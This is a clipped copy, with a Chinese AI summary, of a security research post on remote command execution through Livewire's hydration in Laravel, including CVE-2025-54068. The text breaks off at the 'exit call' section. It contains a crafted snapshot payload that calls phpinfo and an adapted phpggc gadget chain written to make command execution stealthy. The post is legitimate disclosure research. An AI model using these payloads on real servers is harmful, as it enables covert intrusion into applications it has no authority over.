---
title: "Livewire: remote command execution through unmarshaling"
source: https://www.synacktiv.com/en/publications/livewire-remote-command-execution-through-unmarshaling.html
source_host: www.synacktiv.com
clip_date: 2026-09-16T13:51:22+08:00
trace_id: 06f82b8b-08cf-4ca7-a54e-5cc5e7796bab
content_hash: f5fc12458bd59406a9d6fceedb32a7aaa371e7fc535cc740cf1efa7caae11760
status: synced
tags:
  - 漏洞分析
  - 反序列化
series: null
feed_source: Synacktiv
ai_summary: Livewire 的 hydration 机制可被滥用组成 gadget 链实现隐蔽远程命令执行，且无需 APP_KEY 的 CVE-2025-54068 能绕过校验。
ai_summary_style: key-points
images_status:
  total: 19
  succeeded: 19
  failed_urls: []
notion_page_id: 3dd75244-d011-8165-aac4-d94abf4a4f51
ioc:
  cves:
    - CVE-2025-54068
  cwes: []
  hashes:
    - 5d8f2f606f8309d12b68e5f895f3ff69eeb4da5ccd77430971d850d860ce38a8
    - 5e6cb3790a1c61816f28bb1a8d92c9704ac67a7b2d5000c568305c704ba7cced
    - 9bfe798289569477fcf865a952a4a8ddeb3c4150df56b4b404e8df400d0aa0be
    - ed40577cb46a002e84fc26c0852b801a9c7476f823f20bc315660847958bc1ca
    - f56c273c0e4a3eaa5d7fdea9e7142c42d0e1128a8aee35e9546baffaa41870ac
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> Livewire 的 hydration 机制可被滥用组成 gadget 链实现隐蔽远程命令执行，且无需 APP_KEY 的 CVE-2025-54068 能绕过校验。
> 
> - **利用前提：** 掌握 APP_KEY 即可伪造 snapshot 载荷，借 clctn、form、mdl 等 synthesizer 递归实例化任意类，形成实例化 gadget 链。
> - **首步链：** Guzzle `FnStream` 的 `__toString` 把用户数组绑定为可调用函数，配合 `ShardedPrefixPublicUrlGenerator` 构造器里 `array_map` 的字符串强转触发调用，可执行 `phpinfo` 等任意函数。
> - **RCE 链：** 经 `Signed::__invoke`、`Queueable::dispatchNextJobInChain` 到达 `unserialize`，用 phpggc 的 `Laravel/RCE4` 适配版（外层包 `BroadcastEvent` 保持流程）执行命令，再用 `Laravel\Prompts\Terminal::exit` 干净终止、避免 500 与日志。
> - **免 APP_KEY：** CVE-2025-54068 滥用 `updates` 字段的弱类型转换（如把标量字段覆写为数组），在递归 hydrate 中夹带 synthesizer 绕过 checksum；影响面含 6400 万次下载、1754 个依赖包及 Filament 登录组件等预认证入口。
> - **工具与修复：** Livepyre 提供有/无 APP_KEY 两种模式，laravel-crypto-killer 新增 exploit 模式；官方补丁引入 `hydratePropertyUpdate` 保留原始 `$raw` 上下文，需升级至 3.6.4+（依赖 APP_KEY 的设计缺陷未修）。

Livewire revolutionizes Laravel development by enabling real-time, interactive web interfaces using only PHP and Blade, removing the need of heavy JavaScript frameworks. Its innovative hydration system seamlessly instantiate and restores component states, supporting complex data types.

However, this mechanism comes with a critical vulnerability: a dangerous unmarshalling process can be exploited as long as an attacker is in possession of the APP_KEY of the application. By crafting malicious payloads, attackers can manipulate Livewire’s hydration process to execute arbitrary code, from simple function calls to stealthy remote command execution.

Finally, our research uncovered a pre-authenticated remote code execution vulnerability in Livewire, exploitable even without knowledge of the application’s APP_KEY. By analyzing Livewire’s recursive hydration mechanism, we found that attackers could inject malicious synthesizers through the updates field in Livewire requests, leveraging PHP’s loose typing and nested array handling. This technique bypasses checksum validation, allowing arbitrary object instantiation and leading to full system compromise.

## Introduction

Livewire has rapidly become one of the most popular full-stack frameworks for Laravel, empowering developers to build dynamic, real-time interfaces with minimal JavaScript. As of 2025, Livewire is used in over **30% of new Laravel projects**, according to community surveys and GitHub trends, making it a cornerstone of modern Laravel development.

According to [builtwith](https://trends.builtwith.com/framework/Laravel-Livewire), there are currently more than 130K public instances of application based on Livewire.

Livewire uses the concepts of hydration and dehydration to manage component states. When a component is dehydrated, its state is saved and sent to the frontend with a checksum. Upon rehydration, the server verifies the checksum before restoring the component's state. This ensures that the component's state has not been altered during transit.

This blogpost aims to fully detail the **hydration mechanism** as well as an **instantiation gadget chain** we identified, which allows an attacker to achieve stealthy **remote command execution**.

## Livewire hydration mechanism

Livewire uses the concepts of hydration and dehydration to manage component states. When a component is dehydrated, its state is saved and sent to the frontend with a checksum. Upon rehydration, the server verifies the checksum before restoring the component's state. This ensures that the component's state has not been altered during transit.

### Example of a Livewire update chain

First, let's see how Livewire is integrated on an actual Laravel project to better understand its purpose.

Consider the following simple [quickstart](https://livewire.laravel.com/docs/3.x/quickstart) example: a basic component that increments or decrements a counter. A Livewire component can be setup with only three files:

-   A component stored in `app/Livewire/`:

```php
// app/Livewire/Counter.php

<?php
 
namespace App\Livewire;
 
use Livewire\Component;
 
class Counter extends Component
{
    public $count;
 
    public function increment()
    {
        $this->count++;
    }
 
    public function decrement()
    {
        $this->count--;
    }
 
    public function render()
    {
        return view('livewire.counter');
    }
}
```

-   A route pointing to this component

```php
// routes/web.php

<?php

use Illuminate\Support\Facades\Route;
use App\Livewire\Counter;
Route::get('/counter', Counter::class);
```

-   A blade referenced in the component

```xml
// resources/views/livewire/counter.blade.php

<div>
    @if($count)
        <h1>{{$count}}</h1>
    @endif

    <button wire:click="increment">+</button>
    <button wire:click="decrement">-</button>
</div>
```

When a user triggers the increment action on the frontend, a POST request is sent to the server to update the component state.

![livewire-update](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ffe97fe9ce5a8c70.webp)

Page associated with the Counter component.

The request looks like this:

```bash
POST /livewire/update HTTP/1.1
Host: livewire.local
[...]

{
    "_token":"jMEN2kTQRrwSA5CgH5y8WWqbCpdb4Lx4iBznnlFD",
    "components":[
        {
            "snapshot":"{\"data\":{\"count\":3},\"memo\":{\"id\":\"Y6a883cdUFy82whZ10JW\",\"name\":\"counter\",\"path\":\"counter\",\"method\":\"GET\",\"children\":[],\"scripts\":[],\"assets\":[],\"errors\":[],\"locale\":\"en\"},\"checksum\":\"f56c273c0e4a3eaa5d7fdea9e7142c42d0e1128a8aee35e9546baffaa41870ac\"}",
            "updates":{},
            "calls":[
                {
                    "path":"",
                    "method":"increment",
                    "params":[]
                }
            ]
        }
    ]
}
```

In this request, two fields are particularly important. First, the `components->snapshot` field contains all the serialized information needed to restore the component’s state on the server side, including the properties and their values. Second, the `components->calls` field defines the list of methods that need to be called on the component, along with any associated parameters.

```json
{
   "data":{
      "count":3
   },
   "memo":{
      "id":"Y6a883cdUFy82whZ10JW",
      "name":"counter",
      "path":"counter",
      "method":"GET",
      "children":[],
      "scripts":[],
      "assets":[],
      "errors":[],
      "locale":"en"
   },
   "checksum":"f56c273c0e4a3eaa5d7fdea9e7142c42d0e1128a8aee35e9546baffaa41870ac"
}
```

`components->snapshot->data` stores the state of the component. While properties with simple types are sent as raw JSON (for instance, `count` in the previous example), complex types can also be serialized using what Livewire calls Synthetizers.

### Livewire synthesizers

Synthesizers provide a mechanism to define how these custom types should be JSON serialized (dehydrated) and JSON deserialized (hydrated) when sent between the client and server. This ensures that the state of these properties is correctly maintained across requests. By implementing custom Synthesizers, developers can extend Livewire's functionality to recognize and manage various property types used in their applications, enhancing the flexibility and capability of Livewire components.

To be considered a synthesizer, a check is made by Livewire on each payload element using the `isSyntheticTuple` function.

```php
 1 <?php
 2
 3 namespace Livewire\Drawer;
 4
 5 class BaseUtils
 6 {
 7      static function isSyntheticTuple($payload) {
 8         return is_array($payload)
 9             && count($payload) === 2
10              && isset($payload[1]['s']);
11      }
12 
13  [...]
14 
15  }
```

The static PHP function `Livewire\Drawer\isSyntheticTuple($payload)` checks whether the provided `$payload` (`snapshot` data element) matches a specific structure: it first verifies that `$payload` is an array (line 8), then ensures it contains exactly two elements (line 9), and finally confirms that the second element (line 10) is an array containing the key ' `s` '. If all these conditions are satisfied, the function returns true, indicating that `$payload` is a synthetic tuple and that it should be hydrated.

As an example, the following `snapshot` contains the element `stdClass`, which will be hydrated as a PHP [stdClass](https://www.php.net/manual/en/class.stdclass.php) by Livewire:

```json
{
  "data": {
    "count": 1,
    "stdClass": [
      {
        "foo": "bar"
      },
      {
        "s": "std"
      }
    ]
  },
  "memo": {
    "id": "f4Ed5D3MrzEN48IeQytO",
    "name": "counter",
    "path": "counter",
    "method": "GET",
    "children": [],
    "scripts": [],
    "assets": [],
    "errors": [],
    "locale": "en"
  },
  "checksum": "ed40577cb46a002e84fc26c0852b801a9c7476f823f20bc315660847958bc1ca"
}
```

By default, the following Synthesizers are available:

-   **wrbl**: A writable value is hydrated and dehydrated using a basic writeable interface.
    
-   **elcln**: An Eloquent collection is hydrated and dehydrated as a group of Eloquent models.
    
-   **mdl**: An Eloquent model is hydrated and dehydrated by serializing its identifier.
    
-   **form**: A form object is hydrated and dehydrated, maintaining its internal public properties.
    
-   **fil**: A file upload object is hydrated and dehydrated to handle temporary file references.
    
-   **cbn**: A Carbon date instance is hydrated and dehydrated by serializing its timestamp or ISO format.
    
-   **clctn**: A Laravel collection is hydrated and dehydrated by converting it to and from arrays.
    
-   **str**: A Stringable object is hydrated and dehydrated as its string representation.
    
-   **enm**: An Enum case is hydrated and dehydrated by serializing its value or name.
    
-   **std**: A standard `stdClass` object is hydrated and dehydrated by treating its properties as an associative array.
    
-   **arr**: A simple PHP array is hydrated and dehydrated without transformation.
    
-   **int**: An integer value is hydrated and dehydrated directly.
    
-   **float**: A float value is hydrated and dehydrated directly.
    

The list of available synthesizers can be found directly in the Livewire source code, particularly in the `vendor/livewire/livewire/src/Mechanisms/HandleComponents/HandleComponents.php` file:

```php
<?php
//[...]
protected $propertySynthesizers = [
        Synthesizers\CarbonSynth::class,
        Synthesizers\CollectionSynth::class,
        Synthesizers\StringableSynth::class,
        Synthesizers\EnumSynth::class,
        Synthesizers\StdClassSynth::class,
        Synthesizers\ArraySynth::class,
        Synthesizers\IntSynth::class,
        Synthesizers\FloatSynth::class
    ];
/[...]
```

Additionally, any class that extends the base `Synth` class may be used as a synthesizer. This opens up the possibility for developers to register their own custom types and ensure that Livewire can manage them just as easily as the built-in types.

### Interesting available hydrators

Synthesizers are meant to serialise and deserialise specific PHP objects. For each available hydrator, the `hydrate` method will be called with the data that should be hydrated, and the data can be sent as a scalar type or a metadata tuple. An interesting fact is that some hydrators support embedded objects and therefore allow to recursively hydrate objects. Below is a diagram showing how recursive hydration works:

![Recursive hydration.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ce1921f540f1ff1b.webp)

In the context of Livewire, a hydrator will basically allow a user to call a constructor on any object of a project.

![Arbitrary instantiation](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bd703082e5c48260.webp)

#### CollectionSynth

The `CollectionSynth` class is used to manage how collection-like objects are handled during the component dehydration and hydration processes. Its role is to ensure that when data move between the frontend and backend, PHP collections (such as Laravel’s `Collection` instances) are properly reconstructed.

```php
 1  <?php
 2 
 3  namespace Livewire\Mechanisms\HandleComponents\Synthesizers;
 4
 5  class CollectionSynth extends ArraySynth {
 6     public static $key = 'clctn';
 7  [...]
 8     function hydrate($value, $meta, $hydrateChild) {
 9         foreach ($value as $key => $child) {
10              $value[$key] = $hydrateChild($key, $child);
11          }
12          return new $meta['class']($value);
13      }
14  }
```

The class defines a static `$key` set to `'clctn'`, which serves as an identifier. This key is used internally by Livewire to associate serialized data with the `CollectionSynth` class during the hydration phase.

When the `hydrate` method is called, it receives a `$value`, which represents the serialized collection data, a `$meta` array containing metadata (such as the name of the original class), and a `$hydrateChild` callback used to individually process each element of the collection. The `$value` is first iterated over, and each item is passed through the `$hydrateChild` function to ensure nested, or complex types are properly rehydrated. Once all elements are processed, a new instance of the original collection class is created using the reconstructed array.

In short, `CollectionSynth` is what allows Livewire to maintain the integrity and functionality of PHP collection objects across frontend-backend communication, making sure that when collections are sent back from the browser, they are restored to their correct PHP class form.

#### FormObjectSynth

The `FormObjectSynth` class is used to handle the (de)hydration of special "form objects" tied to a Livewire component, while ensuring they remain properly linked to the component context.

```php
 1  <?php
 2
 3  namespace Livewire\Features\SupportFormObjects;
 4
 5  class FormObjectSynth extends Synth {
 6      public static $key = 'form';
 7
 8
 9      function hydrate($data, $meta, $hydrateChild)
10      {
11          $form = new $meta['class']($this->context->component, $this->path);
12          $callBootMethod = static::bootFormObject($this->context->component, $form, $this->path);
13
14          foreach ($data as $key => $child) {
15              if ($child === null && Utils::propertyIsTypedAndUninitialized($form, $key)) {
16                  continue;
17              }
18
19              $form->$key = $hydrateChild($key, $child);
20          }
21          $callBootMethod();
22          return $form;
23      }
24  }
```

The class defines a static `$key` set to `'form'`, which acts as an identifier allowing Livewire to recognize serialized data that should be handled by `FormObjectSynth`. When hydration occurs, the `hydrate` method is called with `$data`, `$meta`, and a `$hydrateChild` callback. The `$meta` array contains metadata, including the class name of the form object to instantiate. Although `$meta` is user-controlled, the `$this->context` and `$this->path` values used during instantiation are not, which means that only objects whose constructors accept two or fewer weakly-typed parameters (typically the component and a path) can be instantiated successfully.

Inside the `hydrate` method, a new form object is created, and a boot method is optionally called to initialize it further. After that, a loop iterates over the `$data` array, which represents the serialized form fields. Each field is passed through `$hydrateChild` to allow nested structures to be properly restored. These hydrated values are then assigned directly to the corresponding public properties of the form object. As a result, any public property of the instantiated object can be set with controlled values, giving great flexibility in reconstructing the object's internal state based on the incoming data.

In essence, `FormObjectSynth` makes it possible for Livewire to rebuild form objects attached to components, ensuring that they are fully hydrated with the correct structure and values when received from the frontend.

#### ModelSynth

The `ModelSynth` class is responsible for handling the (de)hydration of model objects when communicating between the frontend and the backend. Its main purpose is to correctly reconstruct Eloquent models or model-like objects from serialized data.

```php
 1  <?php
 2
 3  namespace Livewire\Features\SupportModels;
 4
 5  class ModelSynth extends Synth {
 6      use SerializesAndRestoresModelIdentifiers;
 7
 8      public static $key = 'mdl';
 9      [...]
10      function hydrate($data, $meta) {
11          $class = $meta['class'];
12
13          // If no alias found, this returns `null`
14          $aliasClass = Relation::getMorphedModel($class);
15
16          if (! is_null($aliasClass)) {
17              $class = $aliasClass;
18          }
19          // If no key is provided then an empty model is returned
20          if (! array_key_exists('key', $meta)) {
21              return new $class;
22          }
23
24         [...]
25      }
26  }
```

The class defines a static `$key` set to `'mdl'`, which associates this synthesizer with any data that represents a model. When the `hydrate` method is invoked, it receives `$data` and `$meta`, where `$meta` contains the class information necessary for reconstruction. The class name is first retrieved from `$meta['class']`. Then, if a morph alias exists for the class (checked via `Relation::getMorphedModel`), it is resolved; otherwise, the original class is used.

If no specific key is provided in the `$meta` array, indicating that there is no primary key available to fetch a persisted model, a new instance of the class is simply created using a blank constructor. This happens at line 21, where `new $class` is called without any arguments. In this context, the synthesizer’s role is merely to instantiate an object without parameters, assuming the class has a constructor that either takes no argument or has default values for all parameters.

In short, `ModelSynth` ensures that model instances can be recreated even when only their class names are available, falling back to blank instantiation when necessary to keep Livewire components functional.

### Checksum

Livewire generates a checksum (or hash) based on the data sent to the frontend. This checksum is created using a secure hashing algorithm, such as SHA-256, and includes internally encrypted information. This ensures that the data sent from the server to the client has not been tampered.

```php
 1  <?php 
 2
 3  namespace Livewire\Mechanisms\HandleComponents;
 4
 5  use function Livewire\trigger;
 6
 7  class Checksum {
 8      static function verify($snapshot) {
 9          $checksum = $snapshot['checksum'];
10
11         unset($snapshot['checksum']);
12
13         trigger('checksum.verify', $checksum, $snapshot);
14
15         if ($checksum !== $comparitor = self::generate($snapshot)) {
16             trigger('checksum.fail', $checksum, $comparitor, $snapshot);
17
18             throw new CorruptComponentPayloadException;
19         }
20     }
21
22     static function generate($snapshot) {
23         $checksum = hash_hmac('sha256', json_encode($snapshot), $hashKey);
24
25         trigger('checksum.generate', $checksum, $snapshot);
26
27         return $checksum;
28     }
29 }
```

## Building the gadget chain

In order to exploit this hydration process, we built a full gadget chain based on its instantiation mechanism. This part details each step we followed and the logic to make it alive. To do so, we used the `clctn` synthesizer because it allows instantiating arbitrary classes that take an array as parameter in their constructor.

### PHP magic methods

In PHP, several **magic methods** are used throughout the lifecycle of an object. In the context of a `__construct` chain, the following methods are particularly relevant:

-   `__construct`: This method acts as the class constructor. It is automatically called when a new object is created using the `new` keyword, for example: `new Obj(param1, param2)`.
    
-   `__toString`: The `__toString` method is invoked when an object needs to be represented as a string. For instance, when using `print($obj)`, PHP automatically calls `$obj->__toString()` to get the string version of the object.
    
-   `__destruct`: Known as the destructor, this method is automatically called when an object is no longer in use, typically when it goes out of scope or when the script ends. It allows for cleanup operations before the object is fully deallocated.
    
-   `__invoke`: This method is triggered when an object is treated like a function, meaning when a script attempts to call an object directly, such as `$obj()`.
    

You can find detailed explanations for these magic methods (and others) in the [PHP documentation](https://www.php.net/manual/en/language.oop5.magic.php).

### First step: getting a phpinfo

To execute the `phpinfo` function, two PHP classes are involved: `GuzzleHttp\Psr7\FnStream` and `League\Flysystem\UrlGeneration\ShardedPrefixPublicUrlGenerator`.

The first one, `FnStream`, is defined as follows:

```php
 1  <?php
 2
 3  namespace GuzzleHttp\Psr7;
 4
 5  use Psr\Http\Message\StreamInterface;
 6
 7  final class FnStream implements StreamInterface
 8  {
 9
10      public function __construct(array $methods)
11      {
12          $this->methods = $methods;
13          // Create the functions on the class
14          foreach ($methods as $name => $fn) {
15              $this->{'_fn_'.$name} = $fn;
16          }
17      }
18
19      public function __destruct()
20      {
21          if (isset($this->_fn_close)) {
22              ($this->_fn_close)();
23          }
24      }
25
26      public function __toString(): string
27      {
28          try {
29              /** @var string */
30              return ($this->_fn___toString)();
31          } catch (\Throwable $e) {
32              if (\PHP_VERSION_ID >= 70400) {
33                  throw $e;
34              }
35              trigger_error(sprintf('%s::__toString exception: %s', self::class, (string) $e), E_USER_ERROR);
36
37              return '';
38          }
39      }
40  }
```

In this class, the constructor accepts an array as a parameter. Each key-value pair from this array is dynamically assigned to the object as a method-like property, prefixed with `_fn_`. For example, if the array contains a key `__toString`, it will create `$this->_fn___toString`. This means that the object can dynamically respond to certain PHP magic methods based on user-provided functions.

The destructor `__destruct` is automatically called when the object is no longer referenced or at the end of the script. If the special method `_fn_close` has been defined via the constructor, it is called at this moment, effectively executing code during object destruction.

The `__toString` is called to convert an object to a string. It attempts to call the dynamically created `_fn___toString` function.

The second class involved is `ShardedPrefixPublicUrlGenerator`, defined below:

```php
 1  <?php
 2
 3  namespace League\Flysystem\UrlGeneration;
 4
 5  final class ShardedPrefixPublicUrlGenerator implements PublicUrlGenerator
 6  {
 8      private array $prefixes;
 9      private int $count;
10
11      public function __construct(array $prefixes)
12      {
13          $this->count = count($prefixes);
14
15          if ($this->count === 0) {
16              throw new InvalidArgumentException('At least one prefix is required.');
17          }
18
19          $this->prefixes = array_map( 
20                static _fn(string $prefix) => new PathPrefixer($prefix, '/'),
21            $prefixes);
22      }
23
24  }
```

In this class, the constructor expects an array of prefixes. It counts the number of elements and ensures that at least one prefix is provided; otherwise, it throws an exception. The array is then processed using `array_map`, applying a function to each element. Each prefix is passed to a new `PathPrefixer` instance.

Importantly, the `array_map` callback specifies that the input must be a `string`. Therefore, if an object is passed instead of a string, PHP will attempt to cast the object to a string, invoking the `__toString` magic method if it exists on that object.

Now, considering the following crafted payload sent to a Livewire component:

```json
{
  "_token": "kRzCxuIKxdKDKzMZicOa82zwdSe9Q2SWPLCdHoVw",
  "components": [
    {
      "snapshot": "{\"data\":{\"count\":[{\"file_path\":[{\"__toString\":\"phpinfo\"},{\"s\":\"clctn\",\"class\":\"GuzzleHttp\\\\Psr7\\\\FnStream\"}]},{\"class\":\"League\\\\Flysystem\\\\UrlGeneration\\\\ShardedPrefixPublicUrlGenerator\",\"s\":\"clctn\"}]},\"memo\":{\"id\":\"91wbKENP2UIzjEK4pHi2\",\"name\":\"counter\",\"path\":\"counter\",\"method\":\"GET\",\"children\":[],\"scripts\":[],\"assets\":[],\"errors\":[],\"locale\":\"en\"},\"checksum\":\"5d8f2f606f8309d12b68e5f895f3ff69eeb4da5ccd77430971d850d860ce38a8\"}",
      "updates": {},
      "calls": [
        {
          "path": "",
          "method": "increment",
          "params": []
        }
      ]
    }
  ]
}
```

The `snapshot` field in this request, once decoded, contains:

```json
[
    {
      "file_path": [
        {
          "__toString": "phpinfo"
        },
        {
          "s": "clctn",
          "class": "GuzzleHttp\\Psr7\\FnStream"
        }
      ]
    },
    {
      "class": "League\\Flysystem\\UrlGeneration\\ShardedPrefixPublicUrlGenerator",
      "s": "clctn"
    }
  ]
```

![livewire\_recap](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/300f33313c3864a0.webp)

Representative schema of the instantiated object

This data structure will trigger the instantiation of a `FnStream` object where the `__toString` method is dynamically linked to a call to the `phpinfo` function. Then, a `ShardedPrefixPublicUrlGenerator` object is instantiated, receiving an array that contains the `FnStream` object.

Because `ShardedPrefixPublicUrlGenerator` applies `array_map` with a function expecting a `string`, PHP will attempt to cast the `FnStream` object to a string. This action will internally call the `__toString` method defined earlier, which, in this case, executes the `phpinfo` function.

In summary, this chain of logic carefully exploits PHP’s magic methods, type enforcement, and Livewire’s hydration system. It enables dynamic execution of arbitrary functions during the processing of otherwise innocuous serialized data, by leveraging the natural behaviour of `__toString`, `__destruct`, and controlled hydration structures. Sending this crafted payload executes the `phpinfo` function:

![phpinfo](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3d32129a47974760.webp)

As explained above, the recursive hydration scheme leading to the execution of a `phpinfo` is as follows:

![PHP code workflow to gain execution of phpinfo.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e02177d05bd0c942.webp)

### Second step: getting remote command execution

To achieve remote command execution, others gadgets need to be found, as it is necessary to be able to pass arguments to a controlled function.

The first gadget relies on an imprecision in the constructor declaration of `closure` (line 31-32): it is weakly typed. Therefore, it is possible to instantiate it via a `CollectionSynth`, which allows `$this->closure` to be defined as an array. Moreover, the `__invoke` function of this class (line 41) allows us to call any function thanks to the usage of `call_user_func_array`. However, arguments will be blank because they are not controlled. At this point, any public function of any class can be called.

```php
 1  <?php
 2
 3  namespace Laravel\SerializableClosure\Serializers;
 4
 5  use Laravel\SerializableClosure\Contracts\Serializable;
 6  use Laravel\SerializableClosure\Exceptions\InvalidSignatureException;
 7  use Laravel\SerializableClosure\Exceptions\MissingSecretKeyException;
 8
 9  class Signed implements Serializable
10  {
11      /**
12       * The signer that will sign and verify the closure's signature.
13       *
14       * @var \Laravel\SerializableClosure\Contracts\Signer|null
15       */
16      public static $signer;
17
18      /**
19       * The closure to be serialized/unserialized.
20       *
21       * @var \Closure
22       */
23      protected $closure;
24
25      /**
26       * Creates a new serializable closure instance.
27       *
28       * @param  \Closure  $closure
29       * @return void
30       */
31      public function __construct($closure)
32      {
33          $this->closure = $closure;
34      }
35
36      /**
37       * Resolve the closure with the given arguments.
38       *
39       * @return mixed
40       */
41      public function __invoke()
42      {
43          return call_user_func_array($this->closure, func_get_args());
44      }
45  }
```

In this code, the `Queueable` trait is incorporated by using the `use` keyword (line 11), which makes its properties and methods directly accessible within that class. The method `dispatchNextJobInChain` (line 19) is callable because Laravel’s `Laravel\SerializableClosure\Serializers\Signed` class enables the framework to safely serialize and deserialize closures that will be executed later.

A critical point appears at line 22, where the `unserialize` function is invoked on the `$this->chained` array. Since all the variables defined in the `Queueable` trait are public, they can be freely assigned through a form synthesizer, making it possible to control the content of `$this->chained`. Without this level of accessibility, influencing the deserialization process in this way would not have been achievable.

```php
 1  <?php
 2
 3  namespace Illuminate\Bus;
 4
 5  use Closure;
 6  use Illuminate\Queue\CallQueuedClosure;
 7  use Illuminate\Support\Arr;
 8  use PHPUnit\Framework\Assert as PHPUnit;
 9  use RuntimeException;
10
11  trait Queueable
12  {
13
14      public $chained = [];
16      public $chainQueue;
17      public $chainCatchCallbacks;
18
19      public function dispatchNextJobInChain()
20      {
21          if (! empty($this->chained)) {
22              dispatch(tap(unserialize(array_shift($this->chained)), function ($next) {
23                  $next->chained = $this->chained;
24
25                  $next->onConnection($next->connection ?: $this->chainConnection);
26                  $next->onQueue($next->queue ?: $this->chainQueue);
27
28                  $next->chainConnection = $this->chainConnection;
29                  $next->chainQueue = $this->chainQueue;
30                  $next->chainCatchCallbacks = $this->chainCatchCallbacks;
31              }));
32          }
33      }
34
35  }
```

In this class, the `Queueable` trait is included at line 15, which injects the trait’s public properties and queuing-related behavior directly into `BroadcastEvent`. The constructor defined at line 23 accepts the `$event` parameter, once more, without any type restriction, meaning it is weakly typed and therefore able to receive any kind of value.

Because the class exposes several public properties inherited from the trait, an object of `BroadcastEvent` can be instantiated through a form synthesizer, allowing these public variables to be reassigned during construction. This flexibility is what makes it possible for the constructor to extract optional properties from the supplied `$event` instance and apply them dynamically to the new job.

```php
 1  <?php
 2
 3  namespace Illuminate\Broadcasting;
 4
 5  use Illuminate\Bus\Queueable;
 6  use Illuminate\Contracts\Broadcasting\Factory as BroadcastingFactory;
 7  use Illuminate\Contracts\Queue\ShouldQueue;
 8  use Illuminate\Contracts\Support\Arrayable;
 9  use Illuminate\Support\Arr;
10  use ReflectionClass;
11  use ReflectionProperty;
12
13  class BroadcastEvent implements ShouldQueue
14  {
15      use Queueable;
16
17      /**
18       * Create a new job handler instance.
19       *
20       * @param  mixed  $event
21       * @return void
22       */
23      public function __construct($event)
24      {
25          $this->event = $event;
26          $this->tries = property_exists($event, 'tries') ? $event->tries : null;
27          $this->timeout = property_exists($event, 'timeout') ? $event->timeout : null;
28          $this->backoff = property_exists($event, 'backoff') ? $event->backoff : null;
29          $this->afterCommit = property_exists($event, 'afterCommit') ? $event->afterCommit : null;
30          $this->maxExceptions = property_exists($event, 'maxExceptions') ? $event->maxExceptions : null;
31      }
32
33  }
```

![unmarshalling\_to\_unserialize](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/fb5dcb5013704d86.webp)

Laravel is particularly vulnerable to exploits based on the `unserialize` function. Indeed, it contains dozens of valid deserialization payload usable to reach remote command execution.

![Valid unserialization gadget chains on Laravel](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/30769dc32302b60c.webp)

Valid unserialization gadget chains on Laravel

In this case, we generated a gadget chain with the tool [phpggc](https://github.com/ambionics/phpggc), we chose `Laravel/RCE4` developed by BlackFan because it is valid on any version of Laravel. By chaining all together, we built the following payload which allows getting remote command execution on the server:

![Remote Code Execution.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1ab2a6055f0ddac0.webp)

### Third step: make the server flaw stop to be sneaky

#### Building a dedicated POP chain to continue the flow

In order to achieve sneaky command execution, the `Laravel/RCE4` payload had to be adapted so that it did not directly stop the execution flow and cause the server to crash with a code 500 error.

This error is due to the fact that after the call to `unserialize` in the dispatchNextJobInChain function, the code flow is not stopped after the arbitrary code execution. The `PendingBroadcast` object generated from the chain `Laravel/RCE4` is incompatible with this process, the attended type of object is most of the time a `BroadcastEvent` which uses the `Queueable` trait.

```php
[...]
1   public function dispatchNextJobInChain()
2   {
3          if (! empty($this->chained)) {
4              dispatch(tap(unserialize(array_shift($this->chained)), function ($next) {
5                  $next->chained = $this->chained;
6                  $next->onConnection($next->connection ?: $this->chainConnection);
7                  $next->onQueue($next->queue ?: $this->chainQueue);
8                  $next->chainConnection = $this->chainConnection;
9                  $next->chainQueue = $this->chainQueue;
10                 $next->chainCatchCallbacks = $this->chainCatchCallbacks;
11              }));
12      }
13  }
```

So in order to keep the remote command execution from the `PendingBroadcast` trigger, we had to encapsulate it inside a `BroadcastEvent` to keep the PHP flow alive through the `dispatchNextJobInChain` function.

The gadget `Laravel/RCE4` from [phpggc](https://github.com/ambionics/phpggc/tree/master/gadgetchains/Laravel/RCE/4) was therefore adapted and renamed `Laravel/RCE4Adapted`:

-   In the `gadgets.php` file, we see that a `BroadcastEvent` definition was added to allow the code flow to reach its end:

```php
<?php


+ namespace Illuminate\Notifications
+ {
+     class Notification
+     {
+    }
+ }

+ namespace Illuminate\Broadcasting
+ {
+ 
+     class BroadcastEvent
+     {
+         public $dummy;
+         public $connection;
+         public $queue;
+         public $event;
+         public function __construct($dummy)
+         {
+             $this->dummy = $dummy; // Contains the PendingBroadcast object triggering RCE
+             $this->connection = null; // dispatchNextJobInChain line 6
+             $this->queue = null; // dispatchNextJobInChain line 7
+             $this->event = new \Illuminate\Notifications\Notification(); // crashes code flow in BroadcastEvent if undefined
+         }
+     }
+ }

namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        protected $events;
        protected $event;
+        public static $onConnection = 1; // Crashes code flow in PendingBroadcast if not defined

        function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}


namespace Illuminate\Validation
{
    class Validator
    {
        public $extensions;

        function __construct($function)
        {
            $this->extensions = ['' => $function];
        }
    }
}
```

-   In the `chain.php` file, we can see that the main object is now a `BroadcastEvent`, which contains the `PendingBroadcast` triggering the remote command execution:

```php
<?php

namespace GadgetChain\Laravel;

class RCE4Adapted extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.4.0 <= 8.6.9+';
    public static $vector = '__destruct';
    public static $author = 'Remsio, Worty';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

+        return new \Illuminate\Broadcasting\BroadcastEvent(
+            new \Illuminate\Broadcasting\PendingBroadcast(
+                new \Illuminate\Validation\Validator($function),
+                $parameter
+            )
        );
    }
}
```

Thanks to all these adaptations, the code flow now crashes after Livewire's hydrate mechanism, which allows us to inject another gadget before any error!

#### Reach an exit call so the PHP flow stops cleanly

